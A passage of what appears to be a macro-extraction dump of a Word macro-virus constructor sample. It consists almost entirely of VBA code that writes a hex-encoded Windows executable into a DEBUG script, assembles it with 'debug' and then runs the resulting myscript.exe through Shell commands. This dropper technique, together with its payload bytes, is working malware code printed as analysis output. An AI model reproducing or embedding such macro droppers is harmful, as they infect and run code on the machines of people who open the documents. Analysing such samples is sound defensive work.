"e 1890 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 18a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 18b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 18c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 18d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 18e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 18f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1900 41 59 41 4d 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1910 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1920 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1930 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1940 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1950 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1960 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1970 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1980 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1990 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 19a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 19b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 19c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 19d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 19e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 19f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1a00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1a10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1a20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1a30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1a40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1a50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1a60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1a70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1a80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1a90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1aa0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ab0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ac0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ad0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ae0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1af0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1b00 3c 40 00 00 00 00 00 00 00 00 00 00 64 40 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1b10 50 40 00 00 48 40 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1b20 71 40 00 00 5c 40 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1b30 00 00 00 00 00 00 00 00 00 00 00 00 7c 40 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1b40 90 40 00 00 00 00 00 00 9e 40 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1b50 7c 40 00 00 90 40 00 00 00 00 00 00 9e 40 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1b60 00 00 00 00 4b 45 52 4e 45 4c 33 32 2e 64 6c 6c " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1b70 00 55 53 45 52 33 32 2e 64 6c 6c 00 00 00 47 65 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1b80 74 4d 6f 64 75 6c 65 48 61 6e 64 6c 65 41 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1b90 00 00 45 78 69 74 50 72 6f 63 65 73 73 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ba0 4d 65 73 73 61 67 65 42 6f 78 41 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1bb0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1bc0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1bd0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1be0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1bf0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1c00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1c10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1c20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1c30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1c40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1c50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1c60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1c70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1c80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1c90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ca0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1cb0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1cc0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1cd0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ce0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1cf0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1d00 00 10 00 00 64 01 00 00 1b 30 20 30 28 30 3a 30 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1d10 40 30 4c 30 51 30 78 30 96 30 9c 30 a5 30 bc 30 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1d20 cd 30 d6 30 dc 30 e5 30 eb 30 f4 30 fa 30 05 31 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1d30 0f 31 25 31 33 31 3b 31 48 31 61 31 78 31 85 31 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1d40 9d 31 a3 31 b0 31 c7 31 e4 31 f5 31 04 32 25 32 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1d50 39 32 47 32 4d 32 53 32 6d 32 73 32 8d 32 c2 32 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1d60 ce 32 0b 30 38 33 52 33 e1 32 ea 32 f0 32 f6 32 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1d70 ff 32 1e 33 24 33 2f 33 3e 33 48 33 6a 33 79 33 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1d80 88 33 a6 33 ac 33 be 33 c4 33 ca 33 d4 33 df 33 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1d90 ea 33 f0 33 00 34 0b 34 17 34 37 34 43 34 58 34 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1da0 6b 34 77 34 88 34 94 34 9e 34 a8 34 b5 34 c3 34 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1db0 d4 34 e0 34 f1 34 fb 34 04 35 10 35 1d 35 26 35 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1dc0 a7 35 b2 35 bd 35 c8 35 d3 35 de 35 e9 35 14 36 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1dd0 f4 35 1b 36 2a 36 32 36 43 36 54 36 6a 36 78 36 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1de0 80 36 89 36 97 36 9c 36 a9 36 b2 36 b8 36 c1 36 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1df0 ca 36 d0 36 dd 36 ea 36 f3 36 f9 36 0b 37 17 37 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1e00 2d 37 32 37 48 37 4d 37 55 37 69 37 6e 37 76 37 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1e10 8a 37 8f 37 97 37 ab 37 b0 37 b8 37 cc 37 e3 37 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1e20 ec 37 fd 37 04 38 11 38 1a 38 20 38 28 38 2e 38 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1e30 35 38 41 38 4f 38 58 38 64 38 6d 38 73 38 7c 38 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1e40 88 38 91 38 97 38 a0 38 ad 38 b6 38 be 38 c9 38 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1e50 6c 3b 74 3d 8a 3d a2 3d ba 3d d9 3d f8 3d 15 3e " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1e60 30 3e 00 00 00 20 00 00 14 00 00 00 14 30 19 30 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1e70 61 30 67 30 6d 30 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1e80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1e90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ea0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1eb0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ec0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ed0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ee0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ef0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1f00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1f10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1f20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1f30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1f40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1f50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1f60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1f70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1f80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1f90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1fa0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1fb0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1fc0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1fd0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1fe0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 1ff0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 2000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 2010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 2020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 2030 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 2040 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 2050 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 2060 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 2070 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 2080 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 2090 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 20a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 20b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 20c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 20d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 20e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 20f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"RCX" + _
Chr(34) + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"2000" + _
Chr(34) + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"W" + _
Chr(34) + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"Q" + _
Chr(34) + T$
WordBasic.Insert "Close #1" + T$
WordBasic.Insert "Shell " + Chr(34) + "debug < c:\myscript.scr > nul" + _
Chr(34) + T$
WordBasic.Insert "Shell " + Chr(34) + "c:\myscript.exe > nul" + _
Chr(34) + T$

End Sub

-------------------------------------------------------------------------------
VBA MACRO Payload1.bas 
in file: Constructor.MSWord.Ctvck.c - OLE stream: 'Macros/VBA/Payload1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim T$
T$ = Chr(13) + Chr(10)
WordBasic.Insert "Open " + Chr(34) + "C:\myscript.scr" + Chr(34) + _
" For Output As #1" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"n c:\myscript.exe" + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0100 4d 5a 50 00 02 00 00 00 04 00 0f 00 ff ff 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0110 b8 00 00 00 00 00 00 00 40 00 1a 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0120 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0130 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0140 ba 10 00 0e 1f b4 09 cd 21 b8 01 4c cd 21 90 90 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0150 54 68 69 73 20 70 72 6f 67 72 61 6d 20 6d 75 73 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0160 74 20 62 65 20 72 75 6e 20 75 6e 64 65 72 20 57 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0170 69 6e 33 32 0d 0a 24 37 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0180 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0190 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 01a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 01b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 01c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 01d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 01e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 01f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0200 50 45 00 00 4c 01 04 00 85 26 59 bd 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0210 00 00 00 00 e0 00 8e 81 0b 01 02 19 00 08 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0220 00 06 00 00 00 00 00 00 00 10 00 00 00 10 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0230 00 20 00 00 00 00 40 00 00 10 00 00 00 02 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0240 01 00 00 00 00 00 00 00 03 00 0a 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0250 00 50 00 00 00 04 00 00 04 3f 00 00 02 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0260 00 00 10 00 00 20 00 00 00 00 10 00 00 10 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0270 00 00 00 00 10 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0280 00 30 00 00 c2 01 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0290 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 02a0 00 40 00 00 54 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 02b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 02c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 02d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 02e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 02f0 00 00 00 00 00 00 00 00 43 4f 44 45 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0300 00 10 00 00 00 10 00 00 00 08 00 00 00 04 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0310 00 00 00 00 00 00 00 00 00 00 00 00 20 00 00 e0 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0320 44 41 54 41 00 00 00 00 00 10 00 00 00 20 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0330 00 02 00 00 00 0c 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0340 00 00 00 00 40 00 00 c0 2e 69 64 61 74 61 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0350 00 10 00 00 00 30 00 00 00 02 00 00 00 0e 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0360 00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 c0 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0370 2e 72 65 6c 6f 63 00 00 00 10 00 00 00 40 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0380 00 02 00 00 00 10 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0390 00 00 00 00 40 00 00 50 00 00 00 00 00 00 00 00 " + _
